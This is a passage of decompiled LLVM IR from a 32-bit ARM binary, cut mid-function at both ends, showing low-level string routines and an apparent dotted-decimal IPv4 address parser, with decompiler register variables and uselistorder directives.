  uselistorder i32 %v0_13714, { 0, 2, 1 }
  uselistorder i32 %v3_13708, { 1, 0 }
  uselistorder i32 %v5_136ec, { 0, 2, 1, 3 }
  uselistorder i32 ()* @function_d60c, { 2, 5, 4, 3, 7, 6, 1, 0 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder label %dec_label_pc_13780, { 1, 0 }
  uselistorder label %dec_label_pc_13728, { 1, 0 }
  uselistorder label %dec_label_pc_13714, { 1, 0 }
}

define i32 @function_1379c(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1379c:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v3_137a0 = load i32, i32* @r4, align 4
  %v6_137a0 = load i32, i32* @lr, align 4
  %v1_137a4 = add i32 %arg1, 4
  %v2_137a4 = inttoptr i32 %v1_137a4 to i32*
  %v3_137a4 = load i32, i32* %v2_137a4, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_137ac = load i32, i32* %arg2, align 4
  %v3_137ac = add i32 %tmp, 4
  %v4_137ac = inttoptr i32 %v3_137ac to i32*
  %v5_137ac = load i32, i32* %v4_137ac, align 4
  %v6_137b0 = call i32 @function_146a8(i32 %v3_137a4, i32 %v2_137ac, i32 %v5_137ac, i32 %arg3, i32 %v3_137a0, i32 %v6_137a0)
  %v1_137b4 = icmp slt i32 %v2_137ac, 0
  %v6_137b0. = select i1 %v1_137b4, i32 %v6_137b0, i32 0
  store i32 %v6_137b0., i32* %r3.global-to-local, align 4
  br i1 %v1_137b4, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_1379c
  %v3_137c0 = load i32, i32* @r4, align 4
  %v4_137c0 = inttoptr i32 %v3_137c0 to i32*
  store i32 %v6_137b0, i32* %v4_137c0, align 4
  %v6_137c0 = add i32 %v3_137c0, 4
  %v7_137c0 = inttoptr i32 %v6_137c0 to i32*
  store i32 %v2_137ac, i32* %v7_137c0, align 4
  %v0_137c4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_1379c, %bb
  %v0_137c4 = phi i32 [ %v6_137b0, %dec_label_pc_1379c ], [ %v0_137c4.pre, %bb ]
  ret i32 %v0_137c4

; uselistorder directives
  uselistorder i32 %v6_137b0, { 0, 2, 1 }
  uselistorder i32 %v2_137ac, { 1, 2, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_137d0(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_137d4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_137d0

dec_label_pc_137d0:                               ; preds = %bb3, %bb
  %v0_137d4 = phi i32 [ %v0_137d4.pre, %bb ], [ %v5_137d4, %bb3 ]
  %v0_137d0 = phi i32 [ %tmp, %bb ], [ %v5_137d0, %bb3 ]
  %v1_137d0 = inttoptr i32 %v0_137d0 to i8*
  %v2_137d0 = load i8, i8* %v1_137d0, align 1
  %v1_137d4 = inttoptr i32 %v0_137d4 to i8*
  %v2_137d4 = load i8, i8* %v1_137d4, align 1
  %v3_137d4 = zext i8 %v2_137d4 to i32
  %v2_137d8 = icmp eq i8 %v2_137d0, 0
  br i1 %v2_137d8, label %.dec_label_pc_137e4_crit_edge, label %bb3

bb3:                                              ; preds = %dec_label_pc_137d0
  %v5_137d4 = add i32 %v0_137d4, 1
  %v5_137d0 = add i32 %v0_137d0, 1
  %v3_137d0 = zext i8 %v2_137d0 to i32
  %v10_137dc = icmp eq i8 %v2_137d0, %v2_137d4
  br i1 %v10_137dc, label %dec_label_pc_137d0, label %dec_label_pc_137e4

.dec_label_pc_137e4_crit_edge:                    ; preds = %dec_label_pc_137d0
  br label %dec_label_pc_137e4

dec_label_pc_137e4:                               ; preds = %bb3, %.dec_label_pc_137e4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_137e4_crit_edge ], [ %v3_137d0, %bb3 ]
  %v2_137e4.pre-phi = sub nsw i32 %.pn, %v3_137d4
  ret i32 %v2_137e4.pre-phi

; uselistorder directives
  uselistorder i8 %v2_137d0, { 0, 2, 1 }
  uselistorder i32 %v0_137d0, { 1, 0 }
  uselistorder i32 %v0_137d4, { 1, 0 }
  uselistorder label %dec_label_pc_137e4, { 1, 0 }
}

define i32 @function_137f0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13814:
  %v1_137f4 = urem i32 %arg1, 256
  store i32 %v1_137f4, i32* @lr, align 4
  %v4_13814 = mul nuw nsw i32 %v1_137f4, 256
  %v5_13814 = or i32 %v4_13814, %v1_137f4
  %v4_1381c = mul i32 %v5_13814, 65536
  %v5_1381c = or i32 %v4_1381c, %v5_13814
  %v0_13820.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_13820

dec_label_pc_13820:                               ; preds = %dec_label_pc_1388c, %dec_label_pc_13820, %dec_label_pc_13814
  %v0_13820 = phi i32 [ %v0_13820.pre, %dec_label_pc_13814 ], [ %v4_13820, %dec_label_pc_13820 ], [ %v4_13820, %dec_label_pc_1388c ]
  %v1_13820 = inttoptr i32 %v0_13820 to i32*
  %v2_13820 = load i32, i32* %v1_13820, align 4
  %v4_13820 = add i32 %v0_13820, 4
  store i32 %v4_13820, i32* @ip, align 4
  %v2_13828 = xor i32 %v2_13820, %v5_1381c
  %v2_1382c = add i32 %v2_13828, 2130640639
  %v1_13834 = sub i32 -1, %v2_13828
  %v2_13838 = xor i32 %v2_1382c, %v1_13834
  %v2_1383c = and i32 %v2_13838, -2130640640
  %v2_13840 = icmp eq i32 %v2_1383c, 0
  br i1 %v2_13840, label %dec_label_pc_13820, label %dec_label_pc_13848

dec_label_pc_13848:                               ; preds = %dec_label_pc_13820
  %v2_13848 = inttoptr i32 %v0_13820 to i8*
  %v3_13848 = load i8, i8* %v2_13848, align 1
  %v4_13848 = zext i8 %v3_13848 to i32
  %v9_13850 = icmp eq i32 %v4_13848, %v1_137f4
  store i1 %v9_13850, i1* @cpsr_z, align 1
  %v1_13854 = add i32 %v0_13820, 3
  %v1_13858 = add i32 %v0_13820, 1
  %v1_1385c = add i32 %v0_13820, 2
  br i1 %v9_13850, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_13848
  ret i32 %v0_13820

bb18:                                             ; preds = %dec_label_pc_13848
  %v2_13864 = inttoptr i32 %v1_13858 to i8*
  %v3_13864 = load i8, i8* %v2_13864, align 1
  %v4_13864 = zext i8 %v3_13864 to i32
  %v9_13868 = icmp eq i32 %v4_13864, %v1_137f4
  store i1 %v9_13868, i1* @cpsr_z, align 1
  br i1 %v9_13868, label %dec_label_pc_13870, label %dec_label_pc_13878

dec_label_pc_13870:                               ; preds = %bb18
  ret i32 %v1_13858

dec_label_pc_13878:                               ; preds = %bb18
  %v2_13878 = inttoptr i32 %v1_1385c to i8*
  %v3_13878 = load i8, i8* %v2_13878, align 1
  %v4_13878 = zext i8 %v3_13878 to i32
  %v9_1387c = icmp eq i32 %v4_13878, %v1_137f4
  store i1 %v9_1387c, i1* @cpsr_z, align 1
  br i1 %v9_1387c, label %dec_label_pc_13884, label %dec_label_pc_1388c

dec_label_pc_13884:                               ; preds = %dec_label_pc_13878
  ret i32 %v1_1385c

dec_label_pc_1388c:                               ; preds = %dec_label_pc_13878
  %v2_1388c = inttoptr i32 %v1_13854 to i8*
  %v3_1388c = load i8, i8* %v2_1388c, align 1
  %v4_1388c = zext i8 %v3_1388c to i32
  %v9_13890 = icmp eq i32 %v4_1388c, %v1_137f4
  store i1 %v9_13890, i1* @cpsr_z, align 1
  br i1 %v9_13890, label %dec_label_pc_13898, label %dec_label_pc_13820

dec_label_pc_13898:                               ; preds = %dec_label_pc_1388c
  ret i32 %v1_13854

; uselistorder directives
  uselistorder i32 %v4_13820, { 2, 1, 0 }
  uselistorder i32 %v0_13820, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_13814, { 1, 0 }
  uselistorder i32 %v1_137f4, { 2, 3, 4, 5, 6, 0, 1 }
}

define i32 @function_138a8(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_138a8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_138a8 = load i32, i32* @r4, align 4
  store i32 %v3_138a8, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_138b4

dec_label_pc_138b4:                               ; preds = %dec_label_pc_138b4, %dec_label_pc_138a8
  %v0_138b4 = phi i32 [ %v5_138b4, %dec_label_pc_138b4 ], [ %tmp, %dec_label_pc_138a8 ]
  %v1_138b4 = inttoptr i32 %v0_138b4 to i8*
  %v2_138b4 = load i8, i8* %v1_138b4, align 1
  %v3_138b4 = zext i8 %v2_138b4 to i32
  store i32 %v3_138b4, i32* %ip.global-to-local, align 4
  %v5_138b4 = add i32 %v0_138b4, 1
  store i32 %v5_138b4, i32* %r3.global-to-local, align 4
  %v2_138b8 = icmp eq i8 %v2_138b4, 0
  store i1 %v2_138b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_138b8, label %dec_label_pc_138c0, label %dec_label_pc_138b4

dec_label_pc_138c0:                               ; preds = %dec_label_pc_138b4
  %v0_138c0 = load i32, i32* %r2.global-to-local, align 4
  %v7_138c0 = icmp eq i32 %v0_138c0, 3
  store i1 %v7_138c0, i1* %cpsr_z.global-to-local, align 1
  %v1_138c4 = add i32 %v0_138b4, -1
  store i32 %v1_138c4, i32* %lr.global-to-local, align 4
  %tmp10 = icmp ult i32 %v0_138c0, 4
  br i1 %tmp10, label %dec_label_pc_13958thread-pre-split, label %dec_label_pc_138cc

dec_label_pc_138cc:                               ; preds = %dec_label_pc_138c0
  %v3_138cc = udiv i32 %v0_138c0, 4
  store i32 %v3_138cc, i32* %r0.global-to-local, align 4
  %v0_138d0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_138d0

dec_label_pc_138d0:                               ; preds = %dec_label_pc_13930, %dec_label_pc_138cc
  %v2_138d8 = phi i32 [ %v1_13928, %dec_label_pc_13930 ], [ %v1_138c4, %dec_label_pc_138cc ]
  %v0_138d0 = phi i32 [ %v1_13924, %dec_label_pc_13930 ], [ %v0_138d0.pre, %dec_label_pc_138cc ]
  %v1_138d0 = inttoptr i32 %v0_138d0 to i8*
  %v2_138d0 = load i8, i8* %v1_138d0, align 1
  %v3_138d0 = zext i8 %v2_138d0 to i32
  store i32 %v3_138d0, i32* %r3.global-to-local, align 4
  %v2_138d4 = icmp eq i8 %v2_138d0, 0
  store i1 %v2_138d4, i1* %cpsr_z.global-to-local, align 1
  %v3_138d8 = add i32 %v2_138d8, 1
  %v4_138d8 = inttoptr i32 %v3_138d8 to i8*
  store i8 %v2_138d0, i8* %v4_138d8, align 1
  %v0_138dc = load i32, i32* %lr.global-to-local, align 4
  %v1_138dc = add i32 %v0_138dc, 1
  store i32 %v1_138dc, i32* %ip.global-to-local, align 4
  %v0_138e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_138e0, label %.loopexit, label %dec_label_pc_138e4

dec_label_pc_138e4:                               ; preds = %dec_label_pc_138d0
  %v0_138e4 = load i32, i32* @r1, align 4
  %v1_138e4 = add i32 %v0_138e4, 1
  %v2_138e4 = inttoptr i32 %v1_138e4 to i8*
  %v3_138e4 = load i8, i8* %v2_138e4, align 1
  %v4_138e4 = zext i8 %v3_138e4 to i32
  store i32 %v4_138e4, i32* %r3.global-to-local, align 4
  %v2_138e8 = icmp eq i8 %v3_138e4, 0
  store i1 %v2_138e8, i1* %cpsr_z.global-to-local, align 1
  %v3_138ec = add i32 %v0_138dc, 2
  %v4_138ec = inttoptr i32 %v3_138ec to i8*
  store i8 %v3_138e4, i8* %v4_138ec, align 1
  %v0_138f0 = load i32, i32* @r1, align 4
  %v1_138f0 = add i32 %v0_138f0, 1
  store i32 %v1_138f0, i32* %r1.global-to-local, align 4
  %v0_138f4 = load i32, i32* %ip.global-to-local, align 4
  %v1_138f4 = add i32 %v0_138f4, 1
  store i32 %v1_138f4, i32* %ip.global-to-local, align 4
  %v0_138f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_138f8, label %.loopexit, label %dec_label_pc_138fc

dec_label_pc_138fc:                               ; preds = %dec_label_pc_138e4
  %v1_138fc = add i32 %v0_138f0, 2
  %v2_138fc = inttoptr i32 %v1_138fc to i8*
  %v3_138fc = load i8, i8* %v2_138fc, align 1
  %v4_138fc = zext i8 %v3_138fc to i32
  store i32 %v4_138fc, i32* %r3.global-to-local, align 4
  %v2_13900 = icmp eq i8 %v3_138fc, 0
  store i1 %v2_13900, i1* %cpsr_z.global-to-local, align 1
  %v3_13904 = add i32 %v0_138f4, 2
  %v4_13904 = inttoptr i32 %v3_13904 to i8*
  store i8 %v3_138fc, i8* %v4_13904, align 1
  %v0_13908 = load i32, i32* %r1.global-to-local, align 4
  %v1_13908 = add i32 %v0_13908, 1
  store i32 %v1_13908, i32* %r1.global-to-local, align 4
  %v0_1390c = load i32, i32* %ip.global-to-local, align 4
  %v1_1390c = add i32 %v0_1390c, 1
  store i32 %v1_1390c, i32* %lr.global-to-local, align 4
  %v0_13910 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13910, label %.loopexit, label %dec_label_pc_13914

dec_label_pc_13914:                               ; preds = %dec_label_pc_138fc
  %v1_13914 = add i32 %v0_13908, 2
  %v2_13914 = inttoptr i32 %v1_13914 to i8*
  %v3_13914 = load i8, i8* %v2_13914, align 1
  %v4_13914 = zext i8 %v3_13914 to i32
  store i32 %v4_13914, i32* %ip.global-to-local, align 4
  store i32 %v1_13914, i32* %r3.global-to-local, align 4
  %v2_1391c = icmp eq i8 %v3_13914, 0
  store i1 %v2_1391c, i1* %cpsr_z.global-to-local, align 1
  %v3_13920 = add i32 %v0_1390c, 2
  %v4_13920 = inttoptr i32 %v3_13920 to i8*
  store i8 %v3_13914, i8* %v4_13920, align 1
  %v0_13924 = load i32, i32* %r3.global-to-local, align 4
  %v1_13924 = add i32 %v0_13924, 1
  store i32 %v1_13924, i32* @r1, align 4
  %v0_13928 = load i32, i32* %lr.global-to-local, align 4
  %v1_13928 = add i32 %v0_13928, 1
  store i32 %v1_13928, i32* %lr.global-to-local, align 4
  %v0_1392c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1392c, label %.loopexit, label %dec_label_pc_13930

dec_label_pc_13930:                               ; preds = %dec_label_pc_13914
  %v0_13930 = load i32, i32* %r0.global-to-local, align 4
  %v1_13930 = add i32 %v0_13930, -1
  store i32 %v1_13930, i32* %r0.global-to-local, align 4
  %v7_13930 = icmp eq i32 %v0_13930, 1
  store i1 %v7_13930, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13930, label %dec_label_pc_13938, label %dec_label_pc_138d0

dec_label_pc_13938:                               ; preds = %dec_label_pc_13930
  %v0_13938 = load i32, i32* %r2.global-to-local, align 4
  %v1_13938 = urem i32 %v0_13938, 4
  store i32 %v1_13938, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13958

dec_label_pc_13940:                               ; preds = %dec_label_pc_13958
  %v0_13940 = load i32, i32* @r1, align 4
  %v1_13940 = inttoptr i32 %v0_13940 to i8*
  %v2_13940 = load i8, i8* %v1_13940, align 1
  %v3_13940 = zext i8 %v2_13940 to i32
  store i32 %v3_13940, i32* %ip.global-to-local, align 4
  %v2_13944 = icmp eq i8 %v2_13940, 0
  store i1 %v2_13944, i1* %cpsr_z.global-to-local, align 1
  %v1_13948 = add i32 %v1_13964, -1
  store i32 %v1_13948, i32* %r2.global-to-local, align 4
  %v3_1394c = add i32 %v3_13964, 1
  %v4_1394c = inttoptr i32 %v3_1394c to i8*
  store i8 %v2_13940, i8* %v4_1394c, align 1
  %v5_1394c = load i32, i32* %lr.global-to-local, align 4
  %v6_1394c = add i32 %v5_1394c, 1
  store i32 %v6_1394c, i32* %lr.global-to-local, align 4
  %v0_13950 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13950, label %.loopexit, label %dec_label_pc_13954

dec_label_pc_13954:                               ; preds = %dec_label_pc_13940
  %v0_13954 = load i32, i32* @r1, align 4
  %v1_13954 = add i32 %v0_13954, 1
  store i32 %v1_13954, i32* @r1, align 4
  %v0_13958.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13958thread-pre-split

dec_label_pc_13958thread-pre-split:               ; preds = %dec_label_pc_13954, %dec_label_pc_138c0
  %v2_1394c6 = phi i32 [ %v6_1394c, %dec_label_pc_13954 ], [ %v1_138c4, %dec_label_pc_138c0 ]
  %v0_13958.pr = phi i32 [ %v0_13958.pr.pre, %dec_label_pc_13954 ], [ %v0_138c0, %dec_label_pc_138c0 ]
  br label %dec_label_pc_13958

dec_label_pc_13958:                               ; preds = %dec_label_pc_13958thread-pre-split, %dec_label_pc_13938
  %v3_13964 = phi i32 [ %v2_1394c6, %dec_label_pc_13958thread-pre-split ], [ %v1_13928, %dec_label_pc_13938 ]
  %v1_13964 = phi i32 [ %v0_13958.pr, %dec_label_pc_13958thread-pre-split ], [ %v1_13938, %dec_label_pc_13938 ]
  %v2_13958 = icmp eq i32 %v1_13964, 0
  store i1 %v2_13958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13958, label %dec_label_pc_13960, label %dec_label_pc_13940

dec_label_pc_13960:                               ; preds = %dec_label_pc_13958
  %v0_13960 = load i32, i32* %ip.global-to-local, align 4
  %v2_13960 = icmp eq i32 %v0_13960, 0
  store i1 %v2_13960, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13960, label %.loopexit, label %bb

bb:                                               ; preds = %dec_label_pc_13960
  %v4_13964 = add i32 %v3_13964, 1
  %v5_13964 = inttoptr i32 %v4_13964 to i8*
  store i8 0, i8* %v5_13964, align 1
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_13914, %dec_label_pc_138fc, %dec_label_pc_138e4, %dec_label_pc_138d0, %dec_label_pc_13940, %dec_label_pc_13960, %bb
  %v0_13968 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13968, i32* %r0.global-to-local, align 4
  %v2_1396c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1396c, i32* @r4, align 4
  ret i32 %v0_13968

; uselistorder directives
  uselistorder i32 %v1_13964, { 1, 0 }
  uselistorder i32 %v1_13938, { 1, 0 }
  uselistorder i32 %v0_13930, { 1, 0 }
  uselistorder i32 %v1_13928, { 0, 2, 1 }
  uselistorder i32 %v1_13924, { 1, 0 }
  uselistorder i32 %v0_138c0, { 2, 1, 0, 3 }
  uselistorder i32 %v5_138b4, { 1, 0 }
  uselistorder i32 %v0_138b4, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %.loopexit, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @function_13970(i8* %arg1) local_unnamed_addr {
dec_label_pc_13970:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_139a82 = load i32, i32* @r0, align 4
  %v1_139a83 = inttoptr i32 %v0_139a82 to i8*
  %v2_139a84 = load i8, i8* %v1_139a83, align 1
  %v2_139ac6 = icmp eq i8 %v2_139a84, 0
  br i1 %v2_139ac6, label %dec_label_pc_139b8, label %dec_label_pc_13984.preheader

dec_label_pc_1397c:                               ; preds = %dec_label_pc_13984
  %v1_1398c = add i32 %v0_1398c, 1
  %v9_1397c = icmp eq i8 %v0_13998.in, %v2_13984
  br i1 %v9_1397c, label %dec_label_pc_13998, label %dec_label_pc_13984

dec_label_pc_13984:                               ; preds = %dec_label_pc_13984.preheader, %dec_label_pc_1397c
  %v0_1398c = phi i32 [ %tmp, %dec_label_pc_13984.preheader ], [ %v1_1398c, %dec_label_pc_1397c ]
  %v1_13984 = inttoptr i32 %v0_1398c to i8*
  %v2_13984 = load i8, i8* %v1_13984, align 1
  %v3_13984 = zext i8 %v2_13984 to i32
  store i32 %v3_13984, i32* @ip, align 4
  %v2_13988 = icmp eq i8 %v2_13984, 0
  br i1 %v2_13988, label %dec_label_pc_139b8, label %dec_label_pc_1397c

dec_label_pc_13998:                               ; preds = %dec_label_pc_1397c
  %v2_13998 = icmp eq i8 %v0_13998.in, 0
  br i1 %v2_13998, label %dec_label_pc_139b8, label %dec_label_pc_139a0

dec_label_pc_139a0:                               ; preds = %dec_label_pc_13998
  %v1_139a0 = add i32 %v0_139a0, 1
  store i32 %v1_139a0, i32* @lr, align 4
  %v1_139a4 = add i32 %v0_139a4, 1
  %v1_139a8 = inttoptr i32 %v1_139a4 to i8*
  %v2_139a8 = load i8, i8* %v1_139a8, align 1
  %v2_139ac = icmp eq i8 %v2_139a8, 0
  br i1 %v2_139ac, label %dec_label_pc_139b8, label %dec_label_pc_13984.preheader

dec_label_pc_13984.preheader:                     ; preds = %dec_label_pc_13970, %dec_label_pc_139a0
  %v0_139a4 = phi i32 [ %v1_139a4, %dec_label_pc_139a0 ], [ %v0_139a82, %dec_label_pc_13970 ]
  %v0_139a0 = phi i32 [ %v1_139a0, %dec_label_pc_139a0 ], [ 0, %dec_label_pc_13970 ]
  %v0_13998.in = phi i8 [ %v2_139a8, %dec_label_pc_139a0 ], [ %v2_139a84, %dec_label_pc_13970 ]
  br label %dec_label_pc_13984

dec_label_pc_139b8:                               ; preds = %dec_label_pc_13998, %dec_label_pc_139a0, %dec_label_pc_13984, %dec_label_pc_13970
  %v0_139b8 = phi i32 [ 0, %dec_label_pc_13970 ], [ %v0_139a0, %dec_label_pc_13984 ], [ %v1_139a0, %dec_label_pc_139a0 ], [ %v0_139a0, %dec_label_pc_13998 ]
  ret i32 %v0_139b8

; uselistorder directives
  uselistorder i8 %v0_13998.in, { 1, 0 }
  uselistorder i8 %v2_13984, { 1, 2, 0 }
  uselistorder i32 %v0_1398c, { 1, 0 }
  uselistorder label %dec_label_pc_139b8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_13984.preheader, { 1, 0 }
}

define i32 @function_139c0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_139c0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_139c0 = load i32, i32* @r5, align 4
  %v2_139c8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_139c8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_13a503 = load i8, i8* %arg1, align 1
  %v3_13a504 = zext i8 %v2_13a503 to i32
  %v5_13a505 = add i32 %tmp, 1
  store i32 %v5_13a505, i32* @r4, align 4
  %v2_13a546 = icmp eq i8 %v2_13a503, 0
  store i1 %v2_13a546, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13a546, label %dec_label_pc_13a60, label %dec_label_pc_139e8

dec_label_pc_139e8:                               ; preds = %dec_label_pc_139c0, %dec_label_pc_13a50.backedge
  %v0_13a2c = phi i32 [ %v3_13a50, %dec_label_pc_13a50.backedge ], [ %v3_13a504, %dec_label_pc_139c0 ]
  %v1_13a5810.in = phi i32 [ %v3_13a50, %dec_label_pc_13a50.backedge ], [ %v3_13a504, %dec_label_pc_139c0 ]
  %v1_13a5810 = add nsw i32 %v1_13a5810.in, -48
  %v2_139e8 = icmp ugt i32 %v1_13a5810, 8
  %v7_139e8 = icmp eq i32 %v1_13a5810, 9
  store i1 %v7_139e8, i1* %cpsr_z.global-to-local, align 1
  %v2_139f0 = xor i1 %v7_139e8, true
  %v3_139f0 = and i1 %v2_139e8, %v2_139f0
  br i1 %v3_139f0, label %dec_label_pc_13a2c, label %dec_label_pc_139f4

dec_label_pc_139f4:                               ; preds = %dec_label_pc_139e8
  %v0_139f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_139f4 = inttoptr i32 %v0_139f4 to i8*
  %v2_139f4 = load i8, i8* %v1_139f4, align 1
  %v3_139f4 = zext i8 %v2_139f4 to i32
  %v3_139fc = mul nuw nsw i32 %v3_139f4, 10
  %v4_139fc = add nuw nsw i32 %v3_139fc, %v0_13a2c
  %v1_13a00 = add nsw i32 %v4_139fc, -48
  %v2_13a04 = icmp ugt i32 %v1_13a00, 254
  %v7_13a04 = icmp eq i32 %v1_13a00, 255
  store i1 %v7_13a04, i1* %cpsr_z.global-to-local, align 1
  %v2_13a08 = xor i1 %v7_13a04, true
  %v3_13a08 = and i1 %v2_13a04, %v2_13a08
  br i1 %v3_13a08, label %dec_label_pc_13a84, label %dec_label_pc_13a0c

dec_label_pc_13a0c:                               ; preds = %dec_label_pc_139f4
  %v0_13a0c = load i32, i32* %r1.global-to-local, align 4
  %v2_13a0c = icmp eq i32 %v0_13a0c, 0
  store i1 %v2_13a0c, i1* %cpsr_z.global-to-local, align 1
  %v1_13a10 = trunc i32 %v1_13a00 to i8
  store i8 %v1_13a10, i8* %v1_139f4, align 1
  %v0_13a14 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13a14, label %dec_label_pc_13a18, label %dec_label_pc_13a50.backedge

dec_label_pc_13a18:                               ; preds = %dec_label_pc_13a0c
  %v0_13a18 = load i32, i32* @lr, align 4
  %v1_13a18 = add i32 %v0_13a18, 1
  store i32 %v1_13a18, i32* @lr, align 4
  %v7_13a1c = icmp eq i32 %v1_13a18, 4
  store i1 %v7_13a1c, i1* %cpsr_z.global-to-local, align 1
  %v0_13a20 = load i32, i32* %r1.global-to-local, align 4
  %v1_13a20 = add i32 %v0_13a20, 1
  store i32 %v1_13a20, i32* %r1.global-to-local, align 4
  %v8_13a24 = icmp sgt i32 %v1_13a18, 4
  br i1 %v8_13a24, label %dec_label_pc_13a84, label %dec_label_pc_13a50.backedge

dec_label_pc_13a2c:                               ; preds = %dec_label_pc_139e8
  %v7_13a2c = icmp eq i32 %v0_13a2c, 46
  store i1 %v7_13a2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13a2c, label %bb, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_13a2c
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13a84

bb:                                               ; preds = %dec_label_pc_13a2c
  %v1_13a34 = load i32, i32* %r1.global-to-local, align 4
  %v2_13a34 = urem i32 %v1_13a34, 2
  %v2_13a38 = icmp eq i32 %v2_13a34, 0
  store i1 %v2_13a38, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br i1 %v2_13a38, label %dec_label_pc_13a84, label %dec_label_pc_13a44

dec_label_pc_13a44:                               ; preds = %bb
  %v0_13a44 = load i32, i32* @lr, align 4
  %v7_13a44 = icmp eq i32 %v0_13a44, 4
  store i1 %v7_13a44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13a44, label %dec_label_pc_13a84, label %dec_label_pc_13a4c

dec_label_pc_13a4c:                               ; preds = %dec_label_pc_13a44
  %v2_13a4c = load i32, i32* %r0.global-to-local, align 4
  %v3_13a4c = add i32 %v2_13a4c, 1
  %v4_13a4c = inttoptr i32 %v3_13a4c to i8*
  store i8 0, i8* %v4_13a4c, align 1
  %v5_13a4c = load i32, i32* %r0.global-to-local, align 4
  %v6_13a4c = add i32 %v5_13a4c, 1
  store i32 %v6_13a4c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13a50.backedge

dec_label_pc_13a50.backedge:                      ; preds = %dec_label_pc_13a4c, %dec_label_pc_13a0c, %dec_label_pc_13a18
  %v0_13a50 = load i32, i32* @r4, align 4
  %v1_13a50 = inttoptr i32 %v0_13a50 to i8*
  %v2_13a50 = load i8, i8* %v1_13a50, align 1
  %v3_13a50 = zext i8 %v2_13a50 to i32
  %v5_13a50 = add i32 %v0_13a50, 1
  store i32 %v5_13a50, i32* @r4, align 4
  %v2_13a54 = icmp eq i8 %v2_13a50, 0
  store i1 %v2_13a54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13a54, label %dec_label_pc_13a50.dec_label_pc_13a60_crit_edge, label %dec_label_pc_139e8

dec_label_pc_13a50.dec_label_pc_13a60_crit_edge:  ; preds = %dec_label_pc_13a50.backedge
